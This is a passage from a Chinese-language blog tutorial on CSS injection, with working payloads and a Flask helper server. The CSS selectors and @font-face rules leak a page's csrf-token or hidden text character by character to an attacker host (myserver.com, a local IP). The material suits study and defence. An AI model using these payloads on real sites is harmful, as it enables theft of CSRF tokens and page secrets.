class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>当然，同样可以通过has过滤器去攻击<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span><span class="selector-pseudo">:has</span>(meta<span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[content^=<span class="string">&quot;a&quot;</span>]</span>) &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://exp/</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但是meta可以被设置为可见的，与hidden的input不同，不过head也是不可见的，要把head一起设置为可见的（就算不把meta写到head中，浏览器也会自己把他调到head中）<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">head,meta &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">meta<span class="selector-attr">[name=<span class="string">&quot;csrf-token&quot;</span>]</span><span class="selector-attr">[content^=<span class="string">&quot;a&quot;</span>]</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://exp/</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>图片不会显示出来，是因为content只是一个属性，并不是HTML的text，但是meta是可见的，只不过他的高度为0<br><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meta<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="built_in">attr</span>(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是可以利用上面的代码去显示图片</p><h2 id="一次性偷取所有字符"><a href="#一次性偷取所有字符" class="headerlink" title="一次性偷取所有字符"></a>一次性偷取所有字符</h2><p>前面讲解的方法都只能偷取一次，但是css有一个特性<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="attribute">https</span>://myserver.com/start?len=<span class="number">8</span>)</span><br></pre></td></tr></table></figure><br>可以通过上面的代码引入css，那么用下面的代码就可以一次一次去请求value<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;<span class="keyword">@import</span> url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">1</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">2</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">3</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">4</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">5</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">6</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">7</span>)&lt;/style&gt;</span><br><span class="line">&lt;style&gt;@import url(<span class="attribute">https</span>://myserver.com/payload?len=<span class="number">8</span>)&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><p>这里我设计了一个服务端的脚步用于一次性的css注入</p><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template,request,make_response</span><br><span class="line"><span class="keyword">import</span> string,time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/payload&quot;</span>,methods = [<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">    length = <span class="built_in">int</span>(request.args.get(<span class="string">&quot;len&quot;</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;prefix&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            prefix = f.read()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;suffix&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            suffix = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(prefix) &lt; length-<span class="number">1</span> <span class="keyword">or</span> <span class="built_in">len</span>(suffix) &lt; length-<span class="number">1</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    prefixs = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        prefixs.append(csspayload(<span class="string">&quot;^&quot;</span>,<span class="string">&quot;prefix&quot;</span>,prefix+x))</span><br><span class="line">    </span><br><span class="line">    suffixs = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        suffixs.append(csspayload(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;suffix&quot;</span>,x+suffix))</span><br><span class="line"></span><br><span class="line">    prefixs = <span class="string">&#x27;\n&#x27;</span>.join(prefixs)</span><br><span class="line">    suffixs = <span class="string">&#x27;\n&#x27;</span>.join(suffixs)</span><br><span class="line"></span><br><span class="line">    rsp = make_response(prefixs + <span class="string">&#x27;\n&#x27;</span> + suffixs)</span><br><span class="line">    rsp.headers[<span class="string">&#x27;Content-Type&#x27;</span>]= <span class="string">&quot;text/css&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csspayload</span>(<span class="params">symbol,fix,payload</span>):</span><br><span class="line">    <span class="keyword">if</span> fix == <span class="string">&#x27;prefix&#x27;</span>:</span><br><span class="line">        origin = \</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;input[name=&quot;csrf-token&quot;][value&#123;symbol&#125;=&quot;&#123;payload&#125;&quot;] + input &#123;&#123;background: url(http://192.168.3.189:5002/&#123;fix&#125;?q=&#123;payload&#125;)&#125;&#125;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(symbol=symbol,fix=fix,payload=payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        origin = \</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;input[name=&quot;csrf-token&quot;][value&#123;symbol&#125;=&quot;&#123;payload&#125;&quot;] + input &#123;&#123;border-image: url(http://192.168.3.189:5002/&#123;fix&#125;?q=&#123;payload&#125;)&#125;&#125;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(symbol=symbol,fix=fix,payload=payload)</span><br><span class="line">    <span class="keyword">return</span> origin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/prefix&quot;</span>,methods = [<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prefix</span>():</span><br><span class="line">    q = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;prefix&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(q)</span><br><span class="line"></span><br><span class="line">    rsp = make_response(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    rsp.headers[<span class="string">&#x27;Content-Type&#x27;</span>]= <span class="string">&quot;image/jpeg&quot;</span></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/suffix&quot;</span>,methods = [<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">suffix</span>():</span><br><span class="line">    q = request.args.get(<span class="string">&quot;q&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;suffix&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(q)</span><br><span class="line">    rsp = make_response(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    rsp.headers[<span class="string">&#x27;Content-Type&#x27;</span>]= <span class="string">&quot;image/jpeg&quot;</span></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="string">&#x27;5002&#x27;</span>)</span><br></pre></td></tr></table></figure>    </div></div><p>想加快效率，可以通过prefix和suffix的结合来实现两个字符的提取，但是suffix的时候要把 <code>background</code> 改为<code>border-image</code> ，不然的话内容会被覆盖掉，就不会发出请求了</p><blockquote><p>记录一下踩过的坑</p><ol><li>返回的content-type必须设置为text/css</li><li>import url最好和background url不一样（没仔细看文章）</li><li>要用border-image，border-background用不了</li><li>从后读取字符的时候，要x+suffix，而不是suffix+x</li></ol></blockquote><h2 id="偷其他东西"><a href="#偷其他东西" class="headerlink" title="偷其他东西"></a>偷其他东西</h2><h3 id="unicode-range"><a href="#unicode-range" class="headerlink" title="unicode-range"></a>unicode-range</h3><p>通过这种方法可以偷取到其他元素的东西<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;f1&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=1</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">31</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;f2&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=2</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">32</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;f3&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=3</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">33</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fa&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=a</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">61</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fb&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=b</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">62</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fc&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=c</span>);</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">63</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">4em</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: f1, f2, f3, fa, fb, fc;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    Secret: <span class="tag">&lt;<span class="name">div</span>&gt;</span>ca31a<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>执行结果如下<br>chrome:<br><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>firefox:<br><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>这种方法在chrome中可能不会按照顺序，但是在firefox中是按照顺序的，从图中还可以看到一个问题，就是他不会重复盗取字符，每种字符只能盗取一次</p><h3 id="字体高度差异-scrollbar-first-line"><a href="#字体高度差异-scrollbar-first-line" class="headerlink" title="字体高度差异+scrollbar+first-line"></a>字体高度差异+scrollbar+first-line</h3><ol><li><p>字体高度差异<br>假设现在有一种字体 <code>Comic Sans MS</code> ，高度比另一个 <code>Courier New</code> 高。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fa&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-style</span>:monospace;</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">41</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: fa, <span class="string">&quot;Courier New&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">letter-spacing</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">word-break</span>: break-all;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-y</span>: auto;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-x</span>: hidden;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      </span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    Secret: <span class="tag">&lt;<span class="name">div</span>&gt;</span>DBC<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>ABC<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/10/26/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A810-CSS-injection%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p></li><li><p>scrollbar<br>根据css定义，当内容超过容器高度就会出现scrollbar，那么就可以通过给scrollbar设定背景，进行leak</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>::-webkit-scrollbar &#123;</span><br><span class="line">    <span class="attribute">background</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>::-webkit-scrollbar:vertical &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://myserver.com?q=a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>first-line<br>现在的问题就是如何解决顺序问题了。<br>当把div的宽度设置为20（只能显示一个字母），那么其他字母就会被放到第二行，并且把字体尺寸设置为0。接着用first-line这个选择器把第一行的字改为正常尺寸。这样scrollbar的背景图就能正常加载了，说着有点绕，可以看看代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: <span class="string">&quot;fa&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">src</span>:<span class="built_in">local</span>(<span class="string">&#x27;Comic Sans MS&#x27;</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-style</span>:monospace;</span></span><br><span class="line"><span class="language-css">        unicode-range: U+<span class="number">41</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">0px</span>; //尺寸设置为<span class="number">0</span></span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">20px</span>; //宽度只够展示一个字符</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: fa, <span class="string">&quot;Courier New&quot;</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">letter-spacing</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">word-break</span>: break-all;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-y</span>: auto;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow-x</span>: hidden;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span><span class="selector-pseudo">::first-line</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">30px</span>; //用选择器把第一行的字符改为正常的</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    Secret: <span class="tag">&lt;<span class="name">div</span>&gt;</span>CBAD<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>详细demo可以参考这个 <a href="https://demo.vwzq.net/css2.html">https://demo.vwzq.net/css2.html</a></p><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- look mom! no external fonts allowed! --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27;; font-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 